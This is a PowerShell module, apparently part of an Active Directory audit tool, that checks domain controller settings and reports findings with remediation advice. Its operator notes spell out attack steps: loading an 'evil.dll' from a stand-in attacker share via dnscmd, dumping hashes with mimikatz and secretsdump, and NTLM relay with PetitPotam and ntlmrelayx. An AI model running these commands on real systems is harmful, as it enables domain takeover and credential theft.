#requires -Version 5.1


$ctx = $global:BR2.Context

if (-not $ctx.IsDC) { return }

# DNS server existence check
$dnsSvc = Get-Service -Name 'DNS' -ErrorAction SilentlyContinue
$dnsInstalled = ($dnsSvc -ne $null)

$BR2.Raw.DCServices = @{
    DNSInstalled  = $dnsInstalled
    NTDSState     = (Get-Service -Name 'NTDS' -ErrorAction SilentlyContinue).Status
}

# DNS server DLL load privesc
# Members of DnsAdmins can invoke dnscmd to specify an arbitrary DLL that
# loads into dns.exe (LocalSystem). Classic DCSync-prep for users who got DnsAdmins but not Domain Admins.
# Fix: Microsoft added dnscmd restrictions via registry lockdown but historical installs may still be vulnerable.

if ($dnsInstalled) {
    $dnsParamsPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters'
    $plugInDllLockdown = Get-RegistryValueSafe -Path $dnsParamsPath -Name 'ServerLevelPluginDll'
    # Legacy fix: HKLM\...\Parameters\EnableGlobalQueryBlockList etc
    # Modern mitigation: https://support.microsoft.com/en-us/topic/kb5020805

    # Check DnsAdmins group membership if AD module available
    $hasAD = $null -ne (Get-Module -ListAvailable -Name ActiveDirectory)
    if ($hasAD) {
        try {
            Import-Module ActiveDirectory -ErrorAction Stop
            $dnsAdmins = Get-ADGroupMember -Identity 'DnsAdmins' -ErrorAction SilentlyContinue
            $nonBuiltinMembers = @($dnsAdmins | Where-Object { $_.Name -notmatch 'Domain Admins|Enterprise Admins' })

            $BR2.Raw.DnsAdmins = @{
                TotalMembers    = $dnsAdmins.Count
                NonBuiltinCount = $nonBuiltinMembers.Count
                Members         = @($dnsAdmins.Name)
            }

            if ($nonBuiltinMembers.Count -gt 0) {
                $BR2.Findings.Add( (New-Finding `
                    -CheckID 'BR-DNS-001' `
                    -Category 'DCHardening' `
                    -Title "DnsAdmins has $($nonBuiltinMembers.Count) non-Domain-Admin member(s) - DLL load privesc path to SYSTEM on DC" `
                    -Severity 'Critical' `
                    -Exploitability 'High' `
                    -AttackPath 'As a DnsAdmins member: dnscmd /config /serverlevelplugindll \\attacker\share\evil.dll then restart DNS service -> dns.exe loads DLL as LocalSystem on DC' `
                    -MITRE @('T1574.001','T1068') `
                    -Evidence @{
                        NonBuiltinMembers = @($nonBuiltinMembers.Name)
                        TotalMembers      = $dnsAdmins.Count
                    } `
                    -Remediation 'Empty DnsAdmins of non-tier-0 members. Apply KB5020805 / dcpromo / dnscmd restrictions. Consider read-only alternatives for DNS record management.' `
                    -OperatorNotes 'Classic DnsAdmins -> DA path. From a DnsAdmins-member shell on the DC: dnscmd <dcname> /config /serverlevelplugindll \\attacker-smb\evil.dll, then net stop dns && net start dns (or sc.exe restart). dns.exe loads the DLL on start - DllMain runs as LocalSystem on the DC. Persistence value: the DLL path survives reboots until manually removed. Often blocked post-KB5020805 because the registry path requires admin to write; if host is unpatched (older than Dec 2022), still viable.' `
                    -References @(
                        'https://www.semperis.com/blog/from-dnsadmins-to-system-to-domain-compromise/',
                        'https://support.microsoft.com/en-us/topic/kb5020805'
                    )
                ))
            }
        } catch {}
    }
}

# DSRM Admin logon behavior
# DSRM (Directory Services Restore Mode) password is a local admin-equivalent
# credential on the DC. Normally only usable in DSRM boot. If
# DsrmAdminLogonBehavior = 2, the DSRM password can be used for network
# logon (pass-the-hash) - one of the more subtle backdoor flags.

$dsrmBehavior = Get-RegistryValueSafe -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'DsrmAdminLogonBehavior'

$BR2.Raw.DSRM = @{ DsrmAdminLogonBehavior = $dsrmBehavior }

if ($dsrmBehavior -eq 2) {
    $BR2.Findings.Add( (New-Finding `
        -CheckID 'BR-DC-001' `
        -Category 'DCHardening' `
        -Title 'DsrmAdminLogonBehavior=2 permits DSRM account network logon - persistence backdoor pattern' `
        -Severity 'Critical' `
        -Exploitability 'High' `
        -AttackPath 'DSRM Administrator NT hash recoverable from lsadump::lsa /patch; with DsrmAdminLogonBehavior=2 the hash works for remote logon - persistent DC-local admin after password rotations' `
        -MITRE 'T1098' `
        -Evidence @{ DsrmAdminLogonBehavior = $dsrmBehavior } `
        -Remediation 'Set DsrmAdminLogonBehavior=0 (default). This registry value has no legitimate production use. If present on a DC, investigate the change trail - it is a classic persistence marker.' `
        -OperatorNotes 'On a DC as Domain Admin: mimikatz lsadump::lsa /patch extracts the DSRM hash from SAM. Combined with DsrmAdminLogonBehavior=2, a standard PtH against the DC as "DC$\Administrator" (local RID-500-equivalent) works indefinitely - even if all domain admin passwords are rotated. This is the primary "DC backdoor" pattern - always check when landing on a DC you did not provision.' `
        -References @(
            'https://adsecurity.org/?p=1714',
            'https://www.mandiant.com/resources/blog/hunting-malicious-dsrm'
        )
    ))
}

# NTDS.dit ACL
if ($ctx.Elevated) {
    $ntdsPath = Get-RegistryValueSafe -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'DSA Database file'
    if ($ntdsPath -and (Test-Path $ntdsPath)) {
        try {
            $acl = Get-Acl -LiteralPath $ntdsPath -ErrorAction Stop
            $risky = @()
            foreach ($ace in $acl.Access) {
                if ($ace.AccessControlType -ne 'Allow') { continue }
                if ($ace.FileSystemRights -notmatch 'Read|FullControl') { continue }
                $idRef = "$($ace.IdentityReference)"
                if ($idRef -match 'Administrators|SYSTEM|Domain Admins|Enterprise Admins|BUILTIN') { continue }
                $risky += $idRef
            }
            if ($risky.Count -gt 0) {
                $BR2.Findings.Add( (New-Finding `
                    -CheckID 'BR-DC-002' `
                    -Category 'DCHardening' `
                    -Title "NTDS.dit file has non-default read ACL entries ($($risky.Count) principal(s))" `
                    -Severity 'Critical' `
                    -Exploitability 'High' `
                    -AttackPath 'Direct read of NTDS.dit by non-privileged principal - offline extraction of entire domain hash set' `
                    -MITRE 'T1003.003' `
                    -Evidence @{
                        NtdsPath   = $ntdsPath
                        ExtraReaders = @($risky | Sort-Object -Unique)
                    } `
                    -Remediation 'Reset NTDS.dit ACL to default (SYSTEM FullControl, Administrators FullControl). The file is normally locked by the NTDS service but shadow copy bypasses the lock.' `
                    -OperatorNotes 'VSS shadow + copy ntds.dit + copy HKLM\SYSTEM. impacket secretsdump -system SYSTEM -ntds ntds.dit LOCAL yields every NT hash in the domain. With default ACLs, requires admin on DC; non-default ACL grants this capability to the listed principals.' `
                    -References @()
                ))
            }
        } catch {}
    }
}

# SMB signing on DC (required for DC safety)
# Covered in CoercionAndRelayPosture, but highlight critical nature on DC
# Check LDAP signing at the same time

$ldapSigning = Get-RegistryValueSafe -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'LDAPServerIntegrity'
# 1 = optional, 2 = required

$ldapChBind = Get-RegistryValueSafe -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'LdapEnforceChannelBinding'
# 0 = never, 1 = when supported, 2 = always

$BR2.Raw.DCLDAP = @{
    LDAPServerIntegrity        = $ldapSigning
    LdapEnforceChannelBinding  = $ldapChBind
}

# Covered in separate collectors - DC just re-emphasise
if ($ldapSigning -ne 2) {
    $BR2.Findings.Add( (New-Finding `
        -CheckID 'BR-DC-003' `
        -Category 'DCHardening' `
        -Title "DC LDAP signing not required (LDAPServerIntegrity=$ldapSigning, want 2)" `
        -Severity 'Critical' `
        -Exploitability 'High' `
        -AttackPath 'NTLM relay to LDAP on DC without signing - add users to privileged groups, set RBCD, modify msDS-KeyCredentialLink' `
        -MITRE 'T1557.001' `
        -Evidence @{ LDAPServerIntegrity = $ldapSigning } `
        -Remediation 'Set LDAPServerIntegrity=2 to require signing. Test for legacy app compat first; most modern LDAP clients negotiate sign+seal by default.' `
        -OperatorNotes 'On a host without SMB signing, coerce auth via PetitPotam/Coercer then ntlmrelayx -t ldap://dc -smb2support --delegate-access. RBCD self-takeover on the coerced host; or add member to high-priv group if Account Operators / similar. Canonical modern LDAP relay recipe.' `
        -References @(
            'https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/ldap-channel-binding-signing-requirements-update',
            'https://github.com/topotam/PetitPotam'
        )
    ))
}

if ($ldapChBind -ne 2) {
    $BR2.Findings.Add( (New-Finding `
        -CheckID 'BR-DC-004' `
        -Category 'DCHardening' `
        -Title "DC LDAPS channel binding not enforced (LdapEnforceChannelBinding=$ldapChBind, want 2)" `
        -Severity 'High' `
        -Exploitability 'High' `
        -AttackPath 'Relay NTLM auth through LDAPS without channel binding tokens - same results as unsigned LDAP but over TLS' `
        -MITRE 'T1557.001' `
        -Evidence @{ LdapEnforceChannelBinding = $ldapChBind } `
        -Remediation 'Set LdapEnforceChannelBinding=2. Microsoft has a phased rollout plan for this - current recommendation is "enable always".' `
        -OperatorNotes 'Without channel binding enforcement, ntlmrelayx can relay to LDAPS as well as LDAP. Adds resilience when LDAP is signed but LDAPS is the only listener left open to relay.' `
        -References @('https://msrc.microsoft.com/update-guide/vulnerability/ADV190023')
    ))
}

# ---- Pre-auth not required (AS-REP roasting surface) -----------------

# Covered in KerberosHygiene but DCs are where we'd scan the whole domain.
# Skip here if covered upstream.
